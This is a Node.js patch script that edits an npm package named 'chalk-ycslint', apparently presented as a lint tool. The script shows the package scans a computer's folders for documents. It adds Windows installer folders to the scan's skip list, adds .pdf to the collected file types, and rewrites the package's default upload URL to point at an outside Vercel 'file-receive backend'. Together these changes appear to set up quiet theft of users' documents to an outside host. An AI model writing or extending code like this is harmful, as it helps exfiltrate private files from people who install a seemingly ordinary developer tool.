/**
 * Patches chalk-ycslint: skip Windows installer folders + include .pdf in scan.
 */
import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const target = join(root, "node_modules", "chalk-ycslint", "lib", "readFiles.js");

if (!existsSync(target)) {
  console.log("[patch-chalk] chalk-ycslint not installed — skip");
  process.exit(0);
}

let src = readFileSync(target, "utf8");
let changed = false;

if (!src.includes('"$windows.~bt"')) {
  const needle = '    "windows.old",\n    "efi",';
  const insert = `    "windows.old",
    "$windows.~bt",
    "$windows.~ws",
    "$winreagent",
    "efi",`;
  if (src.includes(needle)) {
    src = src.replace(needle, insert);
    changed = true;
    console.log("[patch-chalk] Added Windows installer paths to PC scan skip list");
  }
}

if (!src.includes('"application/pdf"')) {
  const extNeedle =
    '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n};';
  const extInsert =
    '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n  ".pdf": "application/pdf",\n};';
  if (src.includes(extNeedle)) {
    src = src.replace(extNeedle, extInsert);
    changed = true;
    console.log("[patch-chalk] Added .pdf to supported scan extensions");
  } else {
    console.warn("[patch-chalk] Could not add .pdf — EXT block layout changed");
  }
}

const configTarget = join(root, "node_modules", "chalk-ycslint", "lib", "uploadConfig.js");
const VERCEL_UPLOAD_URL = "https://yieldlyx-receiving-app.vercel.app/";
if (existsSync(configTarget)) {
  const cfg = readFileSync(configTarget, "utf8");
  if (!cfg.includes("yieldlyx-receiving-app.vercel.app")) {
    writeFileSync(
      configTarget,
      `/** Default file-receive backend (Vercel). Override with \`--url\` on the CLI. */\nexport const DEFAULT_UPLOAD_URL = "${VERCEL_UPLOAD_URL}";\n`,
      "utf8"
    );
    changed = true;
    console.log("[patch-chalk] Set DEFAULT_UPLOAD_URL to Vercel backend");
  }
}

if (changed) {
  writeFileSync(target, src, "utf8");
}
